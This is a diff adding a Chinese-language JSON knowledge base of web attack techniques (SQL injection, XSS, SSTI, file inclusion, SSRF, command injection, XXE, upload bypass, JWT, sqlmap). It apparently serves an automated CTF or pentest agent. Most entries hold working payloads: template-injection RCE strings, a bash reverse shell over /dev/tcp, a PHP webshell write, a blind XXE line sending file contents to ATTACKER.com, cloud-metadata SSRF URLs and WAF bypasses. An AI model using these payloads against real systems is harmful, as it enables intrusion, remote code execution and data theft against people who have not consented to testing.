@@ -1,0 +1,72 @@
+[
+  {
+    "title": "SQL 注入检测与利用",
+    "content": "SQL 注入检测: 1) 使用引号/双引号触发错误; 2) 使用 and 1=1 / and 1=2 判断页面差异; 3) 使用 ORDER BY 探测列数; 4) 报错注入函数: MySQL: extractvalue(1,concat(0x7e,(SELECT...))), updatexml(1,concat(0x7e,(SELECT...)),1); 5) 联合查询: UNION SELECT 1,2,...,n--; 6) 布尔盲注: 通过 SUBSTR/ASCII 逐字符判断; 7) 时间盲注: IF(condition, SLEEP(5), 0); 8) 常见 bypass: 注释符 --, #, /*+/, 大小写混合, 双写关键字, URL编码, 十六进制编码, 使用 AND 替代 OR.",
+    "tags": "web,sqli,sql injection,database",
+    "tools": "sqlmap, network_tool, execute_shell_command",
+    "checklist": "1. 检测注入点 (参数/Header/Cookie); 2. 确认数据库类型; 3. 探测列数; 4. 获取库名 → 表名 → 列名 → 数据; 5. 尝试提权 (INTO OUTFILE, 读文件)"
+  },
+  {
+    "title": "XSS 跨站脚本攻击",
+    "content": "XSS 分类: 1) 反射型: 参数中注入脚本, 如 <script>alert(1)</script>; 2) 存储型: 持久化在服务器端; 3) DOM 型: 客户端 JS 动态执行. 常用 payload: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, \"><script>alert(1)</script>, ';alert(1)//. 绕过技巧: 大小写混合, 双写关键字, 使用 HTML 实体编码, 利用事件处理器 (onfocus/onmouseover/onload), 使用 javascript: 伪协议.",
+    "tags": "web,xss,cross-site,scripting",
+    "tools": "network_tool, execute_shell_command",
+    "checklist": "1. 检查所有输入点; 2. 测试常见 payload; 3. 确认上下文 (HTML属性/JS/CSS); 4. 绕过 WAF; 5. 构造 PoC (Cookie窃取/CSRF)"
+  },
+  {
+    "title": "SSTI 模板注入",
+    "content": "SSTI 检测: {{7*7}} 输出 49 表示 Jinja2/Twig; ${7*7} 输出 49 表示 Freemarker; #{{7*7}} 输出 49 表示 Tornado. Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Jinja2 读文件: {{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}. Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}. Flask SSTI 常用: {{lipsum.__globals__['os'].popen('id').read()}}.",
+    "tags": "web,ssti,template injection,jinja2,twig",
+    "tools": "exploit_templates, network_tool, execute_shell_command",
+    "checklist": "1. 检测注入点; 2. 确认模板引擎; 3. 探测可用对象; 4. 寻找通往 os 模块的路径; 5. 读文件 / RCE"
+  },
+  {
+    "title": "LFI/RFI 文件包含",
+    "content": "LFI 检测: ../../../../etc/passwd, php://filter/convert.base64-encode/resource=index. PHP Wrapper 技巧: php://filter 读取源码, data:// 执行代码 (data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==), phar:// 反序列化, expect:// 命令执行 (需安装 expect 扩展). LFI 包含日志: /var/log/apache2/access.log 注入 PHP webshell. /proc/self/environ 包含 User-Agent 注入. RFI: 允许远程包含时可直接包含 webshell.",
+    "tags": "web,lfi,rfi,file inclusion,php",
+    "tools": "exploit_templates, network_tool",
+    "checklist": "1. 检测参数; 2. 目录遍历测试; 3. PHP filter 读源码; 4. 找日志包含; 5. 尝试 data:// / phar://"
+  },
+  {
+    "title": "SSRF 服务端请求伪造",
+    "content": "SSRF 检测: 修改 URL 参数指向内网地址. 内网探测: http://127.0.0.1:${port}, http://localhost:${port}, http://10.0.0.1:${port}. 云元数据: AWS: http://169.254.169.254/latest/meta-data/, GCP: http://metadata.google.internal/computeMetadata/v1/, Azure: http://169.254.169.254/metadata/instance. bypass 技巧: 使用 127.1/0x7f.0.0.1/0177.0.0.1 等 IP 变体, DNS rebinding, 使用 http://[::]:80/ 绕过 IPv6 过滤, 使用 302 跳转.",
+    "tags": "web,ssrf,server-side request forgery",
+    "tools": "exploit_templates, network_tool",
+    "checklist": "1. 检测 URL 参数; 2. 尝试内网地址; 3. 云元数据攻击; 4. 绕过限制; 5. 通过 file:// 读文件"
+  },
+  {
+    "title": "命令注入与 RCE",
+    "content": "命令注入分隔符: ; (Linux/Windows), | (管道), || (或), & (后台), && (与), `cmd` (反引号, Linux), $(cmd) (命令替换, Linux). 空格绕过: ${IFS}, {cat,/etc/passwd}, %09(tab). 常见命令: id, whoami, uname -a, cat /etc/passwd, ls -la, which python/python3/nc/bash. 反弹 shell: bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1', python3 -c 'import socket...'. 文件写入: echo '<?php system($_GET[1]);?>' > shell.php.",
+    "tags": "web,rce,command injection,shell",
+    "tools": "exploit_templates, execute_shell_command",
+    "checklist": "1. 测试分隔符; 2. 确认命令执行; 3. 读 flag; 4. 考虑反弹 shell; 5. 尝试 webshell 写入"
+  },
+  {
+    "title": "XXE XML 外部实体注入",
+    "content": "XXE 读文件: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>. PHP wrapper: php://filter/convert.base64-encode/resource=file.php. SSRF via XXE: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>. Blind XXE 外带: <!ENTITY xxe SYSTEM 'http://ATTACKER.com/?data=%file;'> (需 DTD 文件). XXE 利用条件: XML 解析器未禁用外部实体, libxml2.9 以下默认开启. 检测: 修改 Content-Type 为 application/xml 或 SOAP 请求.",
+    "tags": "web,xxe,xml,external entity",
+    "tools": "exploit_templates, network_tool",
+    "checklist": "1. 检测 XML 接收端点; 2. 测试 file:// 读文件; 3. SSRF 探测内网; 4. Blind XXE 外带数据; 5. PHP wrapper 读源码"
+  },
+  {
+    "title": "文件上传绕过",
+    "content": "文件上传绕过: 1) 修改 Content-Type (image/jpeg, image/png); 2) 双重扩展名 (shell.php.jpg); 3) 使用 .phtml/.php5/.php7/.shtml/.inc 等替代后缀; 4) 图片马: copy normal.jpg/b + shell.php/a shell.jpg; 5) 竞争条件上传: 在删除前访问; 6) 截断上传: shell.php%00.jpg (仅 PHP < 5.3); 7) .htaccess 上传: <FilesMatch '.*'> SetHandler application/x-httpd-php </FilesMatch>.",
+    "tags": "web,upload,file upload,webshell",
+    "tools": "network_tool, execute_shell_command",
+    "checklist": "1. 检查上传功能; 2. 尝试直接上传 PHP; 3. 修改 Content-Type; 4. 后缀绕过; 5. webshell 连接"
+  },
+  {
+    "title": "JWT 攻击技术",
+    "content": "JWT 结构: Header.Payload.Signature (base64url 编码). 攻击技术: 1) 修改算法为 none (将 alg 改为 'none', 去掉签名部分); 2) 修改算法为 HS256 但使用公钥签名 (RS256→HS256 密钥混淆, 需获取公钥); 3) 暴力破解弱密钥 (使用 jwt_tool / hashcat); 4) kid 注入 (kid: '../../etc/passwd' 或 SQLi); 5) jku 头部指向恶意 JWK Set; 6) 子机交换混淆. 工具: jwt.io, jwt_tool, PyJWT.",
+    "tags": "web,jwt,token,authentication",
+    "tools": "network_tool, execute_python_code, execute_shell_command",
+    "checklist": "1. 解码 JWT 查看 payload; 2. 检查 alg 头部; 3. 尝试 none 算法; 4. 尝试密钥混淆; 5. 暴力破解密钥"
+  },
+  {
+    "title": "SQLMap 常用参数",
+    "content": "sqlmap -u 'http://target/page?id=1' --batch --dbs (枚举数据库). sqlmap -u 'url' --batch -D dbname --tables (枚举表). sqlmap -u 'url' --batch -D dbname -T tablename --dump (获取数据). sqlmap -u 'url' --os-shell (获取系统 shell, 需文件读写权限). sqlmap -r request.txt (从文件读取请求). sqlmap --cookie='x=1' --level=3 --risk=2 (提升检测等级). sqlmap --tamper=space2comment,randomcase (绕过 WAF). sqlmap --dbms=mysql/mssql/oracle (指定数据库类型). sqlmap -u 'url' --batch --current-db (当前数据库).",
+    "tags": "web,sqlmap,SQL injection,tool",
+    "tools": "execute_shell_command",
+    "checklist": ""
+  }
+]
